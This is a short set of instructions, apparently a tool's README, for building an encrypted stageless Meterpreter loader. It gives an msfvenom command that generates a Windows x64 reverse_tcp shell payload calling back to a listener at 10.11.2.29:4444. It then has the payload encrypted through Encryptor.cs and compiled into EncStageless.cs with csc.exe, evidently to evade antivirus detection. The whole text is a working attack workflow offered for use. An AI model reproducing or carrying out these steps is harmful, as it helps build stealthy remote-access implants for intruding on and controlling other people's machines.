1. Create a payload
```Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.2.29 LPORT=4444 -f csharp
```

2. Paste the payload to Encryptor.cs
3. Compile and copy the output encrypted payload
```CMD
csc.exe Encryptor.cs
```
4. Paste the encrypted payload in the EncStageless.cs
5. compile the EncStageless.cs file
```CMD
csc.exe EncStageless.cs
```


